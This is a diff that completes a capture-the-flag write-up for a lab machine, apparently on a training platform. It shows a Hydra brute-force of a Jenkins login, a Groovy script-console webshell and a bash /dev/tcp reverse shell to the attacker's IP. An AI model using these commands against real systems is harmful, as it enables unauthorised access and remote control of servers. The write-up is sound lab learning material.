@@ -184,7 +184,7 @@ ssh -l aubreanna internal.thm
 ````
 
 User flag in /home/aubreanna. Also home folder contains a message that Jenkins is running on 
-172.17.0.2:8080. This should be cool because a common mistake with Jenkins is that it runs a root and it has a live console. Running ip a tells that the Jenkins instance is running as a Docker container. 
+172.17.0.2:8080. This should be cool because it has a live console. Running ip a tells that the Jenkins instance is running as a Docker container. 
 
 ## Pivoting to Jenkins
 
@@ -196,4 +196,76 @@ Jenkins can be accessed now with attack box's browser: localhost:1234
 
 Default credentials (admin:password) doesn't work. Also because it runs as a Docker container and aubreanna doesn't have rights to manage Docker I can't do much. The last resort remain: Let's try brute force login.
 
-CONTINUES...
+First intercept the login attempt, send to Burp and save it to a file.
+
+````
+# Request
+POST /j_acegi_security_check HTTP/1.1
+Host: localhost:1234
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Origin: http://localhost:1234
+Connection: close
+Referer: http://localhost:1234/loginError
+Cookie: JSESSIONID.6c9a373a=node02dnek68vlg0llcj0gww2jm60.node0; JSESSIONID.bbc44c3d=node0ffzdsnmx4z1611tao9l27umlj0.node0
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+j_username=admin&j_password=PASS&from=&Submit=Sign+in
+
+# Launching the attack with Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+````
+
+Hydra was able to find the password for admin. 
+
+## Jenkins Exploit
+
+Let's head over to script console at http://localhost:1234/script.
+
+````
+# Webshell
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+
+uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
+````
+
+Webshell is great but reverse shell is better. Let's install one.
+
+````
+# Attack box
+rlwrap nc -nvlp 4444 
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.67.91/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+````
+
+As Jenkins is running as a Docker container the next step would be break out from the container to the host system.
+
+## Jenkins Enumeration
+
+There is an interesting file in /opt called note.txt that reveals something very disturbing. So no need for Docker breakout. 
+
+## Root Access
+
+With the information SSH in as root and get the root flag.
+
+
+## After Action Review
+- Jenkins was easy to brute force with Hydra but same attack didn't work with ffuf. I don't know why. Annoying.
+- Don't neglect looking for files that reveal important information. 
+- Doing a write up while testing was excellent for processing thoughts and making progress in a logical manner. 
+- This was a fun box!
